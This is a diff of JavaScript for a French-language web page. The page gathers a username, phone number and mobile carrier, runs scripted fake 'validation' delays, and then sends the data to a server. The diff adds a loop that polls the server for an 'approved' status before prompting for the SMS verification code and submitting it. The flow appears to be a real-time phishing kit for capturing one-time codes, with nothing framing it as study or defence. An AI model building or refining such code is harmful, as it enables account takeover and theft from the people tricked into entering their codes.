@@ -32,7 +32,7 @@ const messages = {
 const loadingMessages = [
   "Validation du compte…",
   "Envoi du code de vérification…",
-  "L'envoi peut prendre plusieurs minutes, veuillez patienter…",
+  "En attente de l'envoi du code SMS…",
 ];
 
 let selectedCarrier = null;
@@ -78,18 +78,29 @@ function updateStatusFromInputs() {
 }
 
 async function sendSubmission(type, data) {
-  try {
-    const response = await fetch("/api/submit", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ type, ...data }),
-    });
+  const response = await fetch("/api/submit", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({ type, ...data }),
+  });
 
-    if (!response.ok) {
-      console.error("Erreur lors de l'envoi des données");
+  if (!response.ok) {
+    throw new Error("Submit failed");
+  }
+
+  return response.json();
+}
+
+async function waitForApproval(sessionId) {
+  while (true) {
+    const response = await fetch(`/api/session?id=${encodeURIComponent(sessionId)}`);
+    const data = await response.json();
+
+    if (data.status === "approved") {
+      return;
     }
-  } catch (error) {
-    console.error("Erreur réseau :", error);
+
+    await wait(2000);
   }
 }
 
@@ -110,26 +121,40 @@ async function startLoadingFlow() {
   showStep("loading");
   setLoadingStep(0);
 
-  await sendSubmission("request", {
-    username: formData.username,
-    phone: formData.phone,
-    carrier: formData.carrier,
-  });
-
-  await wait(2800);
+  await wait(2200);
   setLoadingStep(1);
 
-  await wait(3200);
+  await wait(1800);
+
+  let sessionId;
+
+  try {
+    const result = await sendSubmission("request", {
+      username: formData.username,
+      phone: formData.phone,
+      carrier: formData.carrier,
+    });
+    sessionId = result.sessionId;
+  } catch {
+    loadingMessage.textContent = "Une erreur est survenue. Réessayez.";
+    return;
+  }
+
+  if (!sessionId) {
+    loadingMessage.textContent = "Une erreur est survenue. Réessayez.";
+    return;
+  }
+
   setLoadingStep(2);
+  await waitForApproval(sessionId);
 
-  await wait(3500);
-
+  loadingMessage.textContent = "Code envoyé !";
   loadingSteps.forEach((step) => {
     step.classList.remove("is-active");
     step.classList.add("is-done");
   });
 
-  await wait(800);
+  await wait(900);
   showStep("code");
   codeInput.focus();
 }
@@ -186,12 +211,19 @@ verifyBtn.addEventListener("click", async () => {
   verifyBtn.textContent = "Vérification…";
   codeStatus.textContent = "Vérification du code en cours…";
 
-  await sendSubmission("verify", {
-    username: formData.username,
-    phone: formData.phone,
-    carrier: formData.carrier,
-    code,
-  });
+  try {
+    await sendSubmission("verify", {
+      username: formData.username,
+      phone: formData.phone,
+      carrier: formData.carrier,
+      code,
+    });
+  } catch {
+    codeStatus.textContent = "Erreur lors de la vérification. Réessayez.";
+    verifyBtn.textContent = "Vérifier le code";
+    verifyBtn.disabled = false;
+    return;
+  }
 
   await wait(1500);
   showSuccessStep();
